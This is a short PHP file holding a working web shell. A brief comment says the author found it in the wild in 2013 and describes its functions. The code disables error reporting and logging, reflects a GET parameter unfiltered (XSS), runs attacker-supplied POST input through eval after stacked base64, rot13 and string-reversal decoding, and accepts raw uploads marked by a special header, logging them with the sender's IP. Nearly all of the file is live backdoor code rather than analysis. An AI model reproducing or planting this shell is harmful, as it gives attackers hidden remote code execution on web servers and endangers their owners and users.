/*
 *
 *	I found this shell at 2013-02-18 
 *
 *	This shell disables logging and error reporting and allows for XSS,
 *	command execution (the command is also obfuscated),
 *	and file uploads.
 */
<?php 
@error_reporting(0);
@ini_set("display_errors",0);
@ini_set("log_errors",0);
@ini_set("error_log",0);
if (isset($_GET['r'])) {
	print $_GET['r'];
} elseif (isset($_POST['e'])) {
	eval(base64_decode(str_rot13(strrev(base64_decode(str_rot13($_POST['e']))))));
} elseif (isset($_SERVER['HTTP_CONTENT_ENCODING']) && $_SERVER['HTTP_CONTENT_ENCODING'] == 'binary') {
	$data = file_get_contents('php://input');
	if (strlen($data) > 0)
		print 'STATUS-IMPORT-OK';
	if (strlen($data) > 12) {
		$fp=@fopen('tmpfile','a');
		@flock($fp, LOCK_EX);
		@fputs($fp, $_SERVER['REMOTE_ADDR']."\t".base64_encode($data)."\r\n");
		@flock($fp, LOCK_UN);
		@fclose($fp);
	}
} exit;
?>